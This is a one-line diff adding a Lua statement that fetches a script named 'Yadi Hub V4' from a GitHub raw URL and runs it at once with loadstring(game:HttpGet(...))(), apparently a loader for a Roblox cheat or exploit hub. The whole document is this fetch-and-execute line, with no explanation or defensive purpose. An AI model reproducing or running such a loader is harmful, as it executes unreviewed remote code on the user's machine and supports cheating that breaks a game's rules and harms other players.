@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Iulkay/Yadi-Hub-V4/main/Yadi%20Hub%20v4"))()
